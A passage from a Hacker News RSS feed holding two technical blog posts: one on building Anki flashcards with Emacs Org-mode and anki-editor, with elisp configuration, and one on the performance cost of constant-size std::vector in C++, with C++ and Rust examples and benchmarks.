<a href="https://www.youtube.com/watch?v=fgizHHd7nOo">John Kitchin - org mode is awesome</a> to have a grasp of Org‚Äôs capability. (Find a
pencil and mark down the date, it may become commemorable later :)). If you
already knew that Org can do outline-structured editing, has tagging system and
rich export support, you should be able to follow the post fine.</p>
<p><span><strong>Note for setup</strong></span>: Most setup is done in Emacs configuration language, Emacs
Lisp, under Linux. I will point out where I think is relevant to explain the
details, and provide download at the end of article. But as always, YMMV in
other platforms. If you are not sure how to configure, comment below, take a
look at <a href="https://github.com/yiufung/dot-emacs/blob/master/init.el">my init.el</a>, or join the friendly <a href="https://www.reddit.com/r/emacs/">r/emacs</a>, <a href="https://www.reddit.com/r/orgmode/">r/orgmode</a> and raise your hand.</p>
<h2 id="emacs-org-mode-as-editor-to-anki">Emacs/Org-mode as editor to Anki</h2>
<p>An Anki note is represented as an Org entry with <a href="https://orgmode.org/manual/Property-syntax.html#Property-syntax">property</a> <code>ANKI_NOTE_TYPE</code>. Each
subheading of the entry corresponds to a <code>field</code> in Anki. <a href="https://orgmode.org/manual/Tags.html">Tags</a> can be synchronized
to Anki. <code>anki-editor</code> uses property value <code>ANKI_NOTE_ID</code> to synchronized an Org
entry and corresponding Anki note.</p>
<video width="100%" controls="" loop="" muted="" playsinline="" preload="metadata">
  <source src="https://yiufung.net/ox-hugo/anki-org-01-basic.mp4" type="video/mp4">
  <source src="https://yiufung.net/ox-hugo/anki-org-01-basic.webm" type="video/webm">
</video>

<p>Upon pushing to Anki, <code>anki-editor</code> will export Org tree as Anki-compatible HTML.
However, without a proper CSS file it will still look plain. So we replace it
with <a href="https://github.com/gongzhitaao/orgcss">gongzhitaao/orgcss</a>, a simple stylesheet for Org-exported HTML, to obtain a
proper styling for source code blocks, lists, tables, etc. (Download at the end
of article)</p>
<video width="100%" controls="" loop="" muted="" playsinline="" preload="metadata">
  <source src="https://yiufung.net/ox-hugo/anki-org-02-update-css.mp4" type="video/mp4">
  <source src="https://yiufung.net/ox-hugo/anki-org-02-update-css.webm" type="video/webm">
</video>

<p>Apart from ‚ÄúBasic‚Äù, another commonly-used note type is <em>Cloze Deletion</em>.</p>
<video width="100%" controls="" loop="" muted="" playsinline="" preload="metadata">
  <source src="https://yiufung.net/ox-hugo/anki-org-03-clozing-shortcuts.mp4" type="video/mp4">
  <source src="https://yiufung.net/ox-hugo/anki-org-03-clozing-shortcuts.webm" type="video/webm">
</video>

<div><pre><code data-lang="emacs-lisp">(<span>use-package</span> <span>anki-editor</span>
  <span>:after</span> <span>org</span>
  <span>:bind</span> (<span>:map</span> <span>org-mode-map</span>
              (<span>"&lt;f12&gt;"</span> . <span>anki-editor-cloze-region-auto-incr</span>)
              (<span>"&lt;f11&gt;"</span> . <span>anki-editor-cloze-region-dont-incr</span>)
              (<span>"&lt;f10&gt;"</span> . <span>anki-editor-reset-cloze-number</span>)
              (<span>"&lt;f9&gt;"</span>  . <span>anki-editor-push-tree</span>))
  <span>:hook</span> (<span>org-capture-after-finalize</span> . <span>anki-editor-reset-cloze-number</span>) <span>; Reset cloze-number after each capture.</span>
  <span>:config</span>
  (<span>setq</span> <span>anki-editor-create-decks</span> <span>t</span> <span>;; Allow anki-editor to create a new deck if it doesn't exist</span>
        <span>anki-editor-org-tags-as-anki-tags</span> <span>t</span>)

  (<span>defun</span> <span>anki-editor-cloze-region-auto-incr</span> (<span>&amp;optional</span> <span>arg</span>)
    <span>"Cloze region without hint and increase card number."</span>
    (<span>interactive</span>)
    (<span>anki-editor-cloze-region</span> <span>my-anki-editor-cloze-number</span> <span>""</span>)
    (<span>setq</span> <span>my-anki-editor-cloze-number</span> (<span>1+</span> <span>my-anki-editor-cloze-number</span>))
    (<span>forward-sexp</span>))
  (<span>defun</span> <span>anki-editor-cloze-region-dont-incr</span> (<span>&amp;optional</span> <span>arg</span>)
    <span>"Cloze region without hint using the previous card number."</span>
    (<span>interactive</span>)
    (<span>anki-editor-cloze-region</span> (<span>1-</span> <span>my-anki-editor-cloze-number</span>) <span>""</span>)
    (<span>forward-sexp</span>))
  (<span>defun</span> <span>anki-editor-reset-cloze-number</span> (<span>&amp;optional</span> <span>arg</span>)
    <span>"Reset cloze number to ARG or 1"</span>
    (<span>interactive</span>)
    (<span>setq</span> <span>my-anki-editor-cloze-number</span> (<span>or</span> <span>arg</span> <span>1</span>)))
  (<span>defun</span> <span>anki-editor-push-tree</span> ()
    <span>"Push all notes under a tree."</span>
    (<span>interactive</span>)
    (<span>anki-editor-push-notes</span> '(<span>4</span>))
    (<span>anki-editor-reset-cloze-number</span>))
  <span>;; Initialize</span>
  (<span>anki-editor-reset-cloze-number</span>)
  )
</code></pre></div><ul>
<li>By default <code>anki-editor-cloze-{dwim,region}</code> always asks for hints and requires
card number input. I don‚Äôt use hints much, and usually want card number to
increase, so two helper functions
<code>anki-editor-cloze-region-{auto-incr,dont-incr}</code> are written to skip these
behaviors. (Note: Such kind of customizations are ubiquitous in Emacs
community, where users don‚Äôt have to wait for upstream to implement a desired
new feature. This is quite different from Anki community where version updates
frequently break existing add-ons, leaving end-users hands tied, or new
features being delayed due to technical difficulty in understanding the code
base.)</li>
<li>A function is added to <code>org-capture-after-finalize-hook</code> to reset cloze number
to 1 after each capture</li>
<li>By default <code>anki-editor-push-notes</code> will push the whole file. This is slow when
the file contain old entries that didn‚Äôt really need to change. In my
workflow, I keep all pending notes under <code>Dispatch Shelf</code> subtree, and push that
whole subtree (with <code>&lt;f9&gt;</code>) when I feel ready. Once they‚Äôre pushed, I would
<a href="https://orgmode.org/manual/Refile-and-copy.html#Refile-and-copy">refile</a>/relocate them under <code>Exported</code> subtree. <code>anki-editor-push-tree</code> is added
for this purpose.</li>
<li>Assign handy keybindings (<code>&lt;f9&gt;-&lt;f12&gt;</code> in this case) to your liking.</li>
</ul>
<h2 id="org-capture-swiftly-create-cards">Org-capture: Swiftly create cards</h2>
<p>Now that we know what a proper Anki note should look like in Org-mode, we can
define a template and use <code>org-capture</code> to create cards swiftly as we came across
different materials on web.</p>
<video width="100%" controls="" loop="" muted="" playsinline="" preload="metadata">
  <source src="https://yiufung.net/ox-hugo/anki-org-04-capture-basic.mp4" type="video/mp4">
  <source src="https://yiufung.net/ox-hugo/anki-org-04-capture-basic.webm" type="video/webm">
</video>

<div><pre><code data-lang="emacs-lisp"><span>;; Org-capture templates</span>
(<span>setq</span> <span>org-my-anki-file</span> <span>"/path/to/your/anki.org"</span>)
(<span>add-to-list</span> <span>'org-capture-templates</span>
             '(<span>"a"</span> <span>"Anki basic"</span>
               <span>entry</span>
               (<span>file+headline</span> <span>org-my-anki-file</span> <span>"Dispatch Shelf"</span>)
               <span>"* %&lt;%H:%M&gt;   %^g\n:PROPERTIES:\n:ANKI_NOTE_TYPE: Basic\n:ANKI_DECK: Mega\n:END:\n** Front\n%?\n** Back\n%x\n"</span>))
(<span>add-to-list</span> <span>'org-capture-templates</span>
             '(<span>"A"</span> <span>"Anki cloze"</span>
               <span>entry</span>
               (<span>file+headline</span> <span>org-my-anki-file</span> <span>"Dispatch Shelf"</span>)
               <span>"* %&lt;%H:%M&gt;   %^g\n:PROPERTIES:\n:ANKI_NOTE_TYPE: Cloze\n:ANKI_DECK: Mega\n:END:\n** Text\n%x\n** Extra\n"</span>))

<span>;; Allow Emacs to access content from clipboard.</span>
(<span>setq</span> <span>x-select-enable-clipboard</span> <span>t</span>
      <span>x-select-enable-primary</span> <span>t</span>)
</code></pre></div><ul>
<li><a href="https://youtu.be/fgizHHd7nOo?t=203">What‚Äôs org-capture?</a></li>
<li>Note the <code>%x</code> in <code>org-capture-templates</code>: this means we want to fill in content of
X clipboard upon capture. For Cloze note, this would be in <code>Text</code> field. For
Basic note, I usually like to put them in <code>Back</code>, and come up with a good
question for <code>Front</code> field.</li>
<li>The key to be as lazy as possible is to let Emacs not only read explicitly
copied/paste content (via <code>C-c</code> / <code>C-v</code>, the <code>CLIPBOARD</code> selection), but also the
<strong>currently selected text</strong> (the <code>PRIMARY</code> selection). That way, after highlighting
text with mouse I can immediately call <code>org-capture (C-c c)</code> in Emacs. See
<a href="https://wiki.archlinux.org/index.php/Clipboard">Clipboard - ArchWiki</a> for details.</li>
<li>Header name does not really matter in <code>anki-editor</code>, <code>%H:%M</code> is an arbitrary
choice</li>
<li>I put most notes in a <code>Mega</code> deck following Michael Nielson‚Äôs advice (<a href="http://augmentingcognition.com/ltm.html">Search
‚ÄúUse one big deck‚Äù</a>). It served me well. If you have many decks/note types, you
may want to create multiple capture templates, or write some elisp functions
to reduce typing.</li>
</ul>
<p>Enabling X clipboard support makes Emacs versatile for textual input from any
other applications. For me it‚Äôs mainly web articles from Firefox, and sometimes
books in PDF.js ‚Ä¶ Or, do I really need PDF.js when I can read books in
<a href="https://github.com/politza/pdf-tools"><code>pdf-tools</code></a>, the best PDF reader in Emacs?</p>
<video width="100%" controls="" loop="" muted="" playsinline="" preload="metadata">
  <source src="https://yiufung.net/ox-hugo/anki-org-05-pdf-tools-clozing.mp4" type="video/mp4">
  <source src="https://yiufung.net/ox-hugo/anki-org-05-pdf-tools-clozing.webm" type="video/webm">
</video>

<p>Emacs command <code>fill-paragraph (M-q)</code> comes handy for aligning irregular-shaped
text copied from PDF.</p>
<h2 id="org-download-plus-flameshot-add-image-too">org-download + Flameshot: Add image too</h2>
<p>Lastly, it‚Äôs also good to use screen crop as note content. Thankfully
<code>anki-editor</code> also supports that, we only need to find a convenient way to
download image in Emacs.</p>
<video width="100%" controls="" loop="" muted="" playsinline="" preload="metadata">
  <source src="https://yiufung.net/ox-hugo/anki-org-06-screenshot.mp4" type="video/mp4">
  <source src="https://yiufung.net/ox-hugo/anki-org-06-screenshot.webm" type="video/webm">
</video>

<p>There are many packages for adding images to Emacs, as well as for screenshots.
I chose the combination of <a href="https://github.com/abo-abo/org-download">abo-abo/org-download</a> and <a href="https://github.com/lupoDharkael/flameshot">Flameshot</a>. While Flameshot
allows me to add preliminary annotation, it‚Äôs a little tricky to get it working
properly. Curious minds may search ‚Äúflameshot‚Äù in <a href="https://github.com/yiufung/dot-emacs/blob/master/init.el">my config</a> for details.</p>
<h2 id="integrate-with-x-window-manager">Integrate with X Window Manager</h2>
<p>To start <code>org-capture</code> frame in whichever application I‚Äôm using, I took a little
elisp function <a href="https://emacs.stackexchange.com/questions/46460/org-capture-frame-with-no-splits">here</a>:</p>
<div><pre><code data-lang="emacs-lisp">(<span>defun</span> <span>make-orgcapture-frame</span> ()
    <span>"Create a new frame and run org-capture."</span>
    (<span>interactive</span>)
    (<span>make-frame</span> '((<span>name</span> . <span>"org-capture"</span>) (<span>window-system</span> . <span>x</span>)))
    (<span>select-frame-by-name</span> <span>"org-capture"</span>)
    (<span>counsel-org-capture</span>)
    (<span>delete-other-windows</span>)
    )
</code></pre></div><p>Then assign a keybinding in X Window Manager (<code>xmonad</code> in my case) that runs
<code>emacsclient -e '(make-orgcapture-frame)'</code>. Now I may create cards with a key combo anywhere in my system.</p>
<h2 id="conclusion">Conclusion</h2>
<p>This setup has served me well in the past few months. During daytime, as I was
writing code in Emacs or browsing web articles, I may capture code snippets or
interesting information without switching to Anki Desktop to do much clicking.
At nighttime I would polish the notes (fixing typo, adding context/images), push
them in one go and call it a day.</p>
<p>The possibilities don‚Äôt end there. Given Org‚Äôs capabilities, I‚Äôm sure there are
more interesting applications. Here are some I have in mind:</p>
<ul>
<li><a href="https://orgmode.org/worg/org-contrib/babel/">Org Babel</a> to evaluate code block in place, pushing <strong>both code and output</strong> (plain
text, images, tables) to Anki: <a href="https://github.com/mjago/ob-lilypond"><code>ob-lilypond</code></a>, <a href="https://orgmode.org/worg/org-contrib/babel/languages/ob-doc-dot.html"><code>ob-dot</code></a>, <a href="https://orgmode.org/worg/org-contrib/babel/languages/ob-doc-R.html">ob-R</a></li>
<li>Use <a href="https://www.youtube.com/watch?v=JfZ9fCHzkJw">keyboard macro</a> to create cards in bulk, quickly</li>
<li>An <a href="https://en.wikipedia.org/wiki/Incremental%5Freading">Incremental Reading</a> system may be built from utilities that centered on
plain/PDF/EPUB(<a href="https://github.com/wasamasa/nov.el">nov.el</a>) text processing, and that integrate with <a href="https://github.com/weirdNox/org-noter"><code>org-noter</code></a>
(note taking with <code>pdf-tools</code>), <a href="https://github.com/jkitchin/org-ref"><code>org-ref</code></a> (academic paper management),
<code>org-capture</code> (content capture), <a href="https://www.google.com/search?q=org-agenda"><code>org-agenda</code></a> (schedule/deadline reminder,
progress tracking)‚Ä¶</li>
<li>An Emacs distribution that is solely designed to smooth out learning curve for
users from Anki community, just as what ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yiufung.net/post/anki-org/">https://yiufung.net/post/anki-org/</a></em></p>]]>
            </description>
            <link>https://yiufung.net/post/anki-org/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802026</guid>
            <pubDate>Sat, 16 Jan 2021 13:23:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[C++ Performance Trap #1: Constant-size std:vector]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25801949">thread link</a>) | @todsacerdoti
<br/>
January 16, 2021 | https://wolchok.org/posts/cxx-trap-1-constant-size-vector/ | <a href="https://web.archive.org/web/*/https://wolchok.org/posts/cxx-trap-1-constant-size-vector/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2 id="c-performance-traps-series-introduction">C++ Performance Traps Series Introduction</h2><p>The C++ standard library has many classes and functions that are easy
to use and relatively safe. However, in situations where performance
and efficiency really matter, straightforward use of the standard
library may not always be the best choice. This post is the first in a
series that will catalogue some of those opportunities for
improvement. It is meant to be accessible to people who are <em>not</em> C++
gurus or language lawyers.</p><p>In each post, we will look at a piece of the C++ standard library that
can cause performance problems and how we might be able to do
better. Although the ability to read x86 assembly language is not
required, I will provide links to code samples and their corresponding
generated assembly on <a href="https://godbolt.org/">Compiler Explorer</a> to
explain why I give the advice I give. I will assume a 64-bit system
and focus on x86_64, but most advice should apply to ARM64 as well.</p><h2 id="c-performance-trap-1-constant-size-stdvector">C++ Performance Trap #1: Constant-size <code>std::vector</code></h2><p>Common advice is to <a href="https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Rsl-arrays">prefer <code>std::vector</code> to C
arrays</a>. This
is all well and good when we want to grow the <code>vector</code> later. If we
don‚Äôt need to do that and performance is critical, we can often do
better for two reasons.</p><h3 id="stdvector-representation"><code>std::vector</code> Representation</h3><p>First of all, <code>std::vector</code> is represented with three pointers: one to
the first element, one just past the last element, and one to the end of the
allocated space, like this:</p><div><pre><code data-lang="c++"><span>template</span> <span>&lt;</span><span>typename</span> T<span>&gt;</span>
<span>struct</span> <span>VectorRepr</span> {
    T <span>*</span>begin;
    T <span>*</span>end;
    T <span>*</span>capacityEnd;
};
</code></pre></div><p>When the size of the <code>vector</code> won‚Äôt change, we will always have <code>end == capacityEnd</code> (or worse, wasted space), so we can eliminate the
third pointer and save space by using a C array with a length (or end pointer) instead,
like this:</p><div><pre><code data-lang="c++"><span>template</span> <span>&lt;</span><span>typename</span> T<span>&gt;</span>
<span>struct</span> <span>MyArray</span> {
    std<span>::</span>unique_ptr<span>&lt;</span>T[]<span>&gt;</span> arr;
    <span>int</span> length;
};
</code></pre></div><p>This can make a big difference in overall memory usage (and thus
<a href="https://ricomariani.medium.com/size-matters-it-may-be-the-only-thing-that-matters-64b473900873">performance</a>)
if this thing is a member of a core data structure.</p><h3 id="stdvector-initialization-overhead"><code>std::vector</code> Initialization Overhead</h3><p>Second, the way we initialize our <code>vector</code> matters. We‚Äôll go through 2
iterations of initializing a <code>vector</code> and then see what we can gain by
using an array instead.</p><p>To give ourselves a concrete example to work with, let‚Äôs say that
we‚Äôll take a length <code>N</code> and return a <code>vector</code> containing the first <code>N</code>
squares:</p><div><pre><code data-lang="c++">std<span>::</span>vector<span>&lt;</span><span>int</span><span>&gt;</span> makeSquares(<span>int</span> howMany);
</code></pre></div><p>A straightforward way to write this function is with
<a href="https://en.cppreference.com/w/cpp/container/vector/reserve"><code>reserve</code></a>
and
<a href="https://en.cppreference.com/w/cpp/container/vector/push_back"><code>push_back</code></a>:</p><div><pre><code data-lang="c++">std<span>::</span>vector<span>&lt;</span><span>int</span><span>&gt;</span> makeSquaresPushBack(<span>int</span> howMany) {
    std<span>::</span>vector<span>&lt;</span><span>int</span><span>&gt;</span> result;
    result.reserve(howMany);
    <span>for</span> (<span>int</span> ii <span>=</span> <span>0</span>; ii <span>&lt;</span> howMany; <span>++</span>ii) {
        result.push_back(ii <span>*</span> ii);
    }
    <span>return</span> result;
}
</code></pre></div><p>(This way would be especially compelling if we wanted to use <a href="https://en.cppreference.com/w/cpp/container/vector/emplace_back"><code>emplace_back</code></a> to construct new objects in place.)</p><p>Let‚Äôs use Compiler Explorer to see <a href="https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(fontScale:14,j:1,lang:c%2B%2B,selection:(endColumn:1,endLineNumber:12,positionColumn:1,positionLineNumber:12,selectionStartColumn:1,selectionStartLineNumber:12,startColumn:1,startLineNumber:12),source:'%23include+%3Cmemory%3E%0A%23include+%3Cvector%3E%0A%0Astd::vector%3Cint%3E+makeSquaresPushBack(int+howMany)+%7B%0A++++std::vector%3Cint%3E+result%3B%0A++++result.reserve(howMany)%3B%0A++++for+(int+ii+%3D+0%3B+ii+%3C+howMany%3B+%2B%2Bii)+%7B%0A++++++++result.push_back(ii+*+ii)%3B%0A++++%7D%0A++++return+result%3B%0A%7D%0A'),l:'5',n:'0',o:'C%2B%2B+source+%231',t:'0')),k:50,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:compiler,i:(compiler:clang1100,filters:(b:'0',binary:'1',commentOnly:'0',demangle:'0',directives:'0',execute:'1',intel:'0',libraryCode:'1',trim:'1'),fontScale:14,j:1,lang:c%2B%2B,libs:!(),options:'-O3+-std%3Dc%2B%2B17',selection:(endColumn:23,endLineNumber:14,positionColumn:23,positionLineNumber:14,selectionStartColumn:23,selectionStartLineNumber:14,startColumn:23,startLineNumber:14),source:1),l:'5',n:'0',o:'x86-64+clang+11.0.0+(Editor+%231,+Compiler+%231)+C%2B%2B',t:'0')),k:50,l:'4',n:'0',o:'',s:0,t:'0')),l:'2',n:'0',o:'',t:'0')),version:4">the assembly</a> that clang 11 generates for this function. We can see that our inner loop (labelled <code>.LBB0_6</code>) is checking to ensure that it hasn‚Äôt overrun the capacity of the <code>vector</code>, and the compiler has emitted code (specifically, the <code>operator new</code>, <a href="https://en.cppreference.com/w/cpp/string/byte/memmove"><code>memmove</code></a>, and <code>operator delete</code> calls) to reallocate if it has. Since we‚Äôve used <code>reserve</code>, we‚Äôll never actually exceed our capacity. So, we‚Äôve bloated our generated code for no good reason.</p><p>What if we try to avoid this by using the <code>vector</code> <a href="https://en.cppreference.com/w/cpp/container/vector/vector">constructor</a> (item (4) in the linked reference) that creates it with the right size in the first place?</p><div><pre><code data-lang="c++">std<span>::</span>vector<span>&lt;</span><span>int</span><span>&gt;</span> makeSquaresPrealloc(<span>int</span> howMany) {
    std<span>::</span>vector<span>&lt;</span><span>int</span><span>&gt;</span> result(howMany);
    <span>for</span> (<span>int</span> ii <span>=</span> <span>0</span>; ii <span>&lt;</span> howMany; <span>++</span>ii) {
        result[ii] <span>=</span> ii <span>*</span> ii;
    }
    <span>return</span> result;
}
</code></pre></div><p>Now <a href="https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(fontScale:14,j:1,lang:c%2B%2B,selection:(endColumn:1,endLineNumber:11,positionColumn:1,positionLineNumber:11,selectionStartColumn:1,selectionStartLineNumber:11,startColumn:1,startLineNumber:11),source:'%23include+%3Cmemory%3E%0A%23include+%3Cvector%3E%0A%0Astd::vector%3Cint%3E+makeSquaresPrealloc(int+howMany)+%7B%0A++++std::vector%3Cint%3E+result(howMany)%3B%0A++++for+(int+ii+%3D+0%3B+ii+%3C+howMany%3B+%2B%2Bii)+%7B%0A++++++++result%5Bii%5D+%3D+ii+*+ii%3B%0A++++%7D%0A++++return+result%3B%0A%7D%0A'),l:'5',n:'0',o:'C%2B%2B+source+%231',t:'0')),k:50,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:compiler,i:(compiler:clang1100,filters:(b:'0',binary:'1',commentOnly:'0',demangle:'0',directives:'0',execute:'1',intel:'1',libraryCode:'1',trim:'1'),fontScale:14,j:1,lang:c%2B%2B,libs:!(),options:'-O3+-std%3Dc%2B%2B17+-fno-vectorize',selection:(endColumn:1,endLineNumber:1,positionColumn:1,positionLineNumber:1,selectionStartColumn:1,selectionStartLineNumber:1,startColumn:1,startLineNumber:1),source:1),l:'5',n:'0',o:'x86-64+clang+11.0.0+(Editor+%231,+Compiler+%231)+C%2B%2B',t:'0')),k:50,l:'4',n:'0',o:'',s:0,t:'0')),l:'2',n:'0',o:'',t:'0')),version:4">the generated
assembly</a>
looks different: we no longer have the capacity check, and our inner
loop gets <a href="https://en.wikipedia.org/wiki/Loop_unrolling">unrolled</a>,
which might be nice if we‚Äôre making big <code>vector</code>s. (It would also get
<a href="https://en.wikipedia.org/wiki/Automatic_vectorization">vectorized</a> if
I hadn‚Äôt passed the <code>-fno-vectorize</code> option to make the output easier
to read.) However, we still have an unnecessary call to
<a href="https://en.cppreference.com/w/cpp/string/byte/memmove"><code>memset</code></a> near
the start of the function. This happens because the <code>vector</code>
constructor we used guarantees that elements are default constructed
(which, for <code>int</code>, means initializing to zero): we can‚Äôt create a
<code>vector</code> of uninitialized space, even though we know that we are about
to initialize the whole <code>vector</code>.</p><p>Here is how I might write this to create an array instead:</p><div><pre><code data-lang="c++"><span>struct</span> <span>IntArray</span> {
    std<span>::</span>unique_ptr<span>&lt;</span><span>int</span> []<span>&gt;</span> arr;
    <span>int</span> length;
};

IntArray <span>makeSquaresArray</span>(<span>int</span> howMany) {
    IntArray result <span>=</span> {std<span>::</span>unique_ptr<span>&lt;</span><span>int</span>[]<span>&gt;</span>{<span>new</span> <span>int</span>[howMany]}, howMany};
    <span>for</span> (<span>int</span> ii <span>=</span> <span>0</span>; ii <span>&lt;</span> howMany; <span>++</span>ii) {
        result.arr[ii] <span>=</span> ii <span>*</span> ii;
    }
    <span>return</span> result;
}
</code></pre></div><p>If we skim <a href="https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(fontScale:14,j:1,lang:c%2B%2B,selection:(endColumn:1,endLineNumber:16,positionColumn:1,positionLineNumber:16,selectionStartColumn:1,selectionStartLineNumber:16,startColumn:1,startLineNumber:16),source:'%23include+%3Cmemory%3E%0A%23include+%3Cvector%3E%0A%0Astruct+IntArray+%7B%0A++++std::unique_ptr%3Cint+%5B%5D%3E+arr%3B%0A++++int+size%3B%0A%7D%3B%0A%0AIntArray+makeSquaresArray(int+howMany)+%7B%0A++++IntArray+result+%3D+%7Bstd::unique_ptr%3Cint%5B%5D%3E%7Bnew+int%5BhowMany%5D%7D,+howMany%7D%3B%0A++++for+(int+ii+%3D+0%3B+ii+%3C+howMany%3B+%2B%2Bii)+%7B%0A++++++++result.arr%5Bii%5D+%3D+ii+*+ii%3B%0A++++%7D%0A++++return+result%3B%0A%7D%0A'),l:'5',n:'0',o:'C%2B%2B+source+%231',t:'0')),k:56.30126771066368,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:compiler,i:(compiler:clang1100,filters:(b:'0',binary:'1',commentOnly:'0',demangle:'0',directives:'0',execute:'1',intel:'1',libraryCode:'1',trim:'1'),fontScale:14,j:1,lang:c%2B%2B,libs:!(),options:'-O3+-std%3Dc%2B%2B17+-fno-vectorize',selection:(endColumn:1,endLineNumber:1,positionColumn:1,positionLineNumber:1,selectionStartColumn:1,selectionStartLineNumber:1,startColumn:1,startLineNumber:1),source:1),l:'5',n:'0',o:'x86-64+clang+11.0.0+(Editor+%231,+Compiler+%231)+C%2B%2B',t:'0')),k:43.69873228933632,l:'4',n:'0',o:'',s:0,t:'0')),l:'2',n:'0',o:'',t:'0')),version:4">the generated assembly</a>, we can see that it is shorter overall, it does not contain an initial call to <code>memset</code>, and the inner loop is very similar.</p><p>We do have one other trick available to us: if we know that the arrays
are never going to exceed some set size (let‚Äôs say we know it‚Äôs 7), we
can put them right inside our <code>IntArray</code> object instead of on the
heap:</p><div><pre><code data-lang="c++"><span>struct</span> <span>InlineIntArray</span> {
    std<span>::</span>array<span>&lt;</span><span>int</span>, <span>7</span><span>&gt;</span> arr;
    <span>int</span> size;
};
</code></pre></div><p>Now we save on both the heap allocation to create the array and the
cache miss to access it. However, we have to be right about the upper
bound on the size, and we really want to end up using most of the
space most of the time. Whether this last step is worthwhile in
practice depends on the specific application, so you‚Äôll want to
measure carefully before doing it.</p><h2 id="benchmarks">Benchmarks</h2><p>By far the top request on <a href="https://www.reddit.com/r/cpp/comments/kyc6f9/c_performance_trap_1_constantsize_stdvector/">the r/cpp
discussion</a>
of this article was
benchmarks. <a href="https://www.reddit.com/user/IHateUsernames111/">u/IHateUsernames111</a>
kindly copied the examples into <a href="https://quick-bench.com/">Quick
Bench</a> (which I learned about today!);
results are
<a href="https://quick-bench.com/q/vUMdQdAFs7W0qHQZSq6cjYFEDEc">here</a>. For the
largest case I was able to run (4096 elements), Quick Bench reports
that the prealloc version is 1.8x faster than push_back, and the array
version is 1.3x faster than prealloc.</p><p>I do want to mention that I didn‚Äôt include benchmarks originally
because it is very easy for them to be misleading. For example, I
haven‚Äôt verified whether the cost of destroying the <code>vector</code> or array
is included in the benchmark measurement. Whether it should be
included depends on the particular application.</p><h2 id="postscript-what-if-we-used-rust">Postscript: What if we used Rust?</h2><p>I am a big fan of the Rust programming language, so I went ahead and
translated the examples to Rust:</p><div><pre><code data-lang="rust"><span>use</span> std::convert::TryInto;

<span>pub</span> <span>fn</span> <span>make_squares_push_back</span>(how_many: <span>i32</span>) -&gt; Vec<span>&lt;</span><span>i32</span><span>&gt;</span> {
    <span>let</span> <span>mut</span> result <span>=</span> Vec::with_capacity(how_many <span>as</span> <span>usize</span>);
    <span>for</span> idx <span>in</span> <span>0</span>..how_many {
        result.push(idx <span>*</span> idx);
    }
    result
}

<span>pub</span> <span>fn</span> <span>make_squares_prealloc</span>(how_many: <span>i32</span>) -&gt; Vec<span>&lt;</span><span>i32</span><span>&gt;</span> {
    <span>let</span> how_many : <span>usize</span> <span>=</span> how_many.try_into().unwrap();
    <span>let</span> <span>mut</span> result <span>=</span> Vec::with_capacity(how_many);
    result.resize(how_many, <span>0</span>);
    <span>for</span> idx <span>in</span> <span>0</span>..how_many {
        result[idx] <span>=</span> (idx <span>*</span> idx) <span>as</span> <span>i32</span>;
    }
    result
}

<span>pub</span> <span>fn</span> <span>make_squares_functional</span>(how_many: <span>i32</span>) -&gt; Vec<span>&lt;</span><span>i32</span><span>&gt;</span> {
    (<span>0</span>..how_many).map(<span>|</span>x<span>|</span> x <span>*</span> x).collect()
}

<span>pub</span> <span>fn</span> <span>make_squares_functional_array</span>(how_many: <span>i32</span>) -&gt; Box<span>&lt;</span>[<span>i32</span>]<span>&gt;</span> {
    (<span>0</span>..how_many).map(<span>|</span>x<span>|</span> x <span>*</span> x).collect()
}
</code></pre></div><p>The contrast was quite interesting. First, two notes on the translation:</p><ul><li>Rust has <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.with_capacity"><code>Vec::with_capacity</code></a>, which is more convenient than calling <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.new"><code>Vec::new</code></a> followed by <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.reserve"><code>reserve</code></a>.</li><li>It <a href="https://doc.rust-lang.org/std/boxed/struct.Box.html#method.new_uninit">looks like</a> creating an uninitialized <code>Box&lt;[i32]&gt;</code> (i.e., a heap-allocated array) requires both nightly Rust and unsafe code, so I didn‚Äôt do it.</li></ul><p>Now, looking at <a href="https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(fontScale:14,j:1,lang:rust,selection:(endColumn:2,endLineNumber:25,positionColumn:2,positionLineNumber:25,selectionStartColumn:2,selectionStartLineNumber:25,startColumn:2,startLineNumber:25),source:'pub+fn+make_squares_push_back(how_many:+i32)+-%3E+Vec%3Ci32%3E+%7B%0A++++let+mut+result+%3D+Vec::with_capacity(how_many+as+usize)%3B%0A++++for+idx+in+0..how_many+%7B%0A++++++++result.push(idx+*+idx)%3B%0A++++%7D%0A++++result%0A%7D%0A%0Apub+fn+make_squares_prealloc(how_many:+i32)+-%3E+Vec%3Ci32%3E+%7B%0A++++let+how_many+:+usize+%3D+how_many+as+usize%3B%0A++++let+mut+result+%3D+Vec::with_capacity(how_many)%3B%0A++++result.resize(how_many,+0)%3B%0A++++for+idx+in+0..how_many+%7B%0A++++++++result%5Bidx%5D+%3D+(idx+*+idx)+as+i32%3B%0A++++%7D%0A++++result%0A%7D%0A%0Apub+fn+make_squares_functional(how_many:+i32)+-%3E+Vec%3Ci32%3E+%7B%0A++++(0..how_many).map(%7Cx%7C+x+*+x).collect()%0A%7D%0A%0Apub+fn+make_squares_functional_array(how_many:+i32)+-%3E+Box%3C%5Bi32%5D%3E+%7B%0A++++(0..how_many).map(%7Cx%7C+x+*+x).collect()%0A%7D'),l:'5',n:'0',o:'Rust+source+%231',t:'0')),k:48.791738101069484,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:compiler,i:(compiler:r1480,filters:(b:'0',binary:'1',commentOnly:'0',demangle:'0',directives:'0',execute:'1',intel:'1',libraryCode:'1',trim:'1'),fontScale:14,j:1,lang:rust,libs:!(),options:'-C+opt-level%3D3+-C+no-vectorize-loops',selection:(endColumn:1,endLineNumber:1,positionColumn:1,positionLineNumber:1,selectionS